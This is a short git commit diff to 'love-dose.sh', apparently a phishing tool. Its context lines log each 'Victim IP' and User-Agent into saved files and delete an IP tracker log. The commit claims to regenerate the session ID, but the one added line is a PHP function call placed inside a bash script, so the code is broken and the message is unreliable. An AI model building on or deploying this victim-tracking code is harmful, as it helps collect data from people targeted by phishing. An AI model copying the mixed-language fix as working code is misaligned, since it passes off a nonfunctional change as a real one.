27946b792afbb6ba9ab0d32f2a188d06655694fb
Bmashike <bonolomashike15@gmail.com>
2026-02-27 01:51:05 -0500

    Regenerate session ID and remove iptracker.log
    Regenerate session ID and clean up iptracker.log if it exists.

--- love-dose.sh
+++ love-dose.sh
@@ -107,6 +107,7 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n"
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
 cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
+session_regenerate_id(true);
 
 if [[ -e iptracker.log ]]; then
 rm -rf iptracker.log
